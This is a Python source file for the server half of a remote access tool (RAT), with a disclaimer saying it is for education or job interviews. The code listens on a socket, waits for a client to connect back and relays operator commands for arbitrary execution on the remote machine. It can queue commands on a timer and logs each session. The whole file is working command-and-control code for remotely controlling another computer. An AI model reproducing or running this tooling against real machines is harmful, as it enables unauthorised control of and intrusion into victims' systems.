#This project is solely for educational or job interview use. The author does not authorize
#the use of this project for any malicious or illegal actions.

#This application allows for arbitrary command execution on the remote client. This application is not a remote shell;
#as such, the application does not keep state. For example, if the user were to enter "cd ..", the application will not
#move up a directory. This application is solely for arbitary command execution.

import os
import socket
import time
import sys
import ipaddress
from threading import Timer

#create a socket object for use throughout the program
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Parse the command line arguments and set the port and hostIP variable for server to open the port on
try:
    #test if the user passed more than or less than 2 arguments. Testing against len(sys.argv) != 3 because the number
    #of arguments is 3 (0 being the app name, 1 being the IP, 2 being the port so 3 total args)
    if len(sys.argv) != 3:
        print("Application takes exactly two arguments - the host IP and port. Run the application like this: python3"
              " Server.py 127.0.0.1 4444\n")
        exit(1)
    else:
        try:
            #use ipaddress.ip_address to test if ip address is valid, not if it's available for the server to attach to
            #convert hostIP to string later for s.bind(())
            hostIP = ipaddress.ip_address(sys.argv[1])
            port = int(sys.argv[2])
        except ValueError:
            print("HostIP is not valid. Enter a valid IP address\n")
            exit(1)
        except:
            print("HostIP and port are not in the right location. Run the application like this: python3 Server.py "
              "127.0.0.1 4444\n")
            exit(1)
except Exception as e:
    print("The following error has occurred: ", e)

#Queue array to hold commands
queue = []

#Variable for the log file name
logFileName = "RAT_Server_log" + str(time.time()) + ".txt"

def help():
    print('=' * 5, 'HELP', '=' * 5)
    print('Enter "quit" to tell the remote server to end the connection')
    print('Enter "stop" to stop RAT server')
    print('Enter "queue" to queue commands to run on the client')
    print('='*16)

def sendCommand(cmd):
    msg = cmd.encode("UTF-8")
    clientaddr.send(msg)
    message = clientaddr.recv(4096)
    print("===Output===")
    print(message.decode("UTF-8"))

def addCommandtoQueue(cmd):
    queue.append(cmd)

def clearQueue():
    queue.clear()

def runCommandsInQueue():
    print('=' * 5, "Command queue running now...", '=' * 5)
    for i in queue:
        sendQueueCommand(i)
    print('=' * 5, "Command queue finished running", '=' * 5)
    print('=' * 5, "Clearing command queue", '=' * 5)
    clearQueue()
    print("Your command to send: ")

def sendQueueCommand(cmd):
    print("Command run: ", cmd)
    msg = cmd.encode("UTF-8")
    clientaddr.send(msg)
    message = clientaddr.recv(4096)
    print("===Output===")
    print(message.decode("UTF-8"))

def startQueue(sec):
    global timer
    timer = Timer(sec, runCommandsInQueue, args=None, kwargs=None)
    try:
        timer.start()
    except Exception as e:
        print("The following exception has occurred: ", e)

def stopQueueFromRunning():
    timer.cancel()

class LoggingPrinter:
    def __init__(self, filename):
        self.out_file = open(filename, "w")
        self.old_stdout = sys.stdout
        #this object will take over `stdout`'s job
        sys.stdout = self
    #executed when the user does a `print`
    def write(self, text):
        self.old_stdout.write(text)
        self.out_file.write(text)
    #executed when `with` block begins
    def __enter__(self):
        return self
    #executed when `with` block ends
    def __exit__(self, type, value, traceback):
        #we don't want to log anymore. Restore the original stdout object.
        sys.stdout = self.old_stdout

#Create directory for the logfile
os.system("mkdir -p /opt/RATServer/")

logFileName = "/opt/RATServer/" + logFileName

with LoggingPrinter(logFileName):

    print("Starting the server...")

    try:
        #Open a port on the server and start listening on it
        #convert hostIP from ipaddress.ip_address object to string for s.bind to work
        hostIP = str(hostIP)
        s.bind((hostIP, port))
        s.listen()
        print("Server started successfully on port", port)
    except Exception as e:
        print("The following error has occurred: ", e)
        exit()

    print("Awaiting connection from client...")
    print("Please wait for connection before issuing commands")

    # accept connection from client software
    # let the end user know that a successful connection came from the client
    try:
        clientaddr = s.accept()[0]
        print("Connection accepted from", clientaddr.getsockname()[0])
    except Exception as e:
        print("The following error has occurred: ", e)
        exit()

    try:
        while True:
            command = input("Your command to send: \n")

            #if user enters "help", then the server should display a help message
            if command.lower() == 'help':
                print(command)
                help()
            #allow the user to queue commands to run on the client
            elif command.lower() == 'queue':
                print("Do you want to adjust the queue timer, stop the queue timer (and keep the commands in the queue),"
                      " add commands to the queue, clear and stop the queue, or go back to the RAT interface?\n")
                while True:
                    decision = input('Type "adjust", "stop", "add", "clear", or "back"\n')
                    if decision.lower() == 'adjust':
                        seconds = input("Enter the number of seconds you want to wait before queue executes\n")
                        seconds = int(seconds)
                        startQueue(seconds)
                        print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
                        break
                    elif decision.lower() == 'stop':
                        stopQueueFromRunning()
                        print("Returning to RAT terminal\n")
                        break
                    elif decision.lower() == 'add':
                        queueCommands = input("Enter the command(s) you want to queue to run on the client. If you want to"
                                              " run multiple commands, separate them with a comma followed by a space. "
                                              "Example: ls, pwd, whoami\n")
                        #See if the user wants to add multiple commands to the queue. If so, then split the user's string
                        #using the comma as a delimiter. Otherwise, just add the one command to the queue
                        try:
                            queueCommands = queueCommands.split(',')
                            for i in queueCommands:
                                addCommandtoQueue(i)
                        except:
                            addCommandtoQueue(queueCommands)

                        #Try stopping an existing queue from running. Otherwise, if the user is setting up a new command
                        #queue, just prompt for the number of seconds the user wants to wait before the queue executes
                        try:
                            stopQueueFromRunning()
                            seconds = input("Enter the number of seconds you want to wait before queue executes\n")
                            seconds = int(seconds)
                            startQueue(seconds)
                            print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
                        except:
                            seconds = input("Enter the number of seconds you want to wait before queue executes\n")
                            seconds = int(seconds)
                            startQueue(seconds)
                            print("Queue scheduled to run in " + str(seconds) + " seconds. Returning to RAT terminal")
                        break
                    elif decision.lower() == 'clear':
                        clearQueue()
                        stopQueueFromRunning()
                        print("Command queue cleared and stopped. Returning to RAT terminal\n")
                        break
                    elif decision.lower() == 'back':
                        break
                    else:
                        print("Not a valid selection.\n")
            #if the user enters "quit", then the server should kill the remote connection
            elif command.lower() == 'quit':
                print(command)
                print("Killing the remote connection")
                sendCommand("quit")
            #if the user enters "stop", the RAT server software should stop running
            elif command.lower() == "stop":
                print(command)
                print("Stopping the RAT server software")
                print("Log file of session created at " + logFileName)
                exit(0)
            elif "cd" in command.lower():
                print("RAT Server software does not keep state and only allows for arbitary command execution. As"
                      " such, the cd command does not work.")
            else:
                print(command)
                sendCommand(command)
    except KeyboardInterrupt as k:
        #gracefully tear down the client connection
        cmd = "quit"
        msg = cmd.encode("UTF-8")
        clientaddr.send(msg)
        message = clientaddr.recv(4096)
        print(message.decode("UTF-8"))

        #gracefully tear down the server
        s.close()

        print("You pressed Ctrl-C. RAT Server stopped. Log file can be found at " + logFileName)
        exit(0)
    except Exception as e:
        #if an exception occurs, try to gracefully tear down the connection. Otherwise, just print the exception
        try:
            # gracefully tear down the client connection
            cmd = "quit"
            msg = cmd.encode("UTF-8")
            clientaddr.send(msg)
            message = clientaddr.recv(4096)
            print(message.decode("UTF-8"))

            # gracefully tear down the server
            s.close()
        except:
            print("The following error has occurred: ", e)
            exit(1)
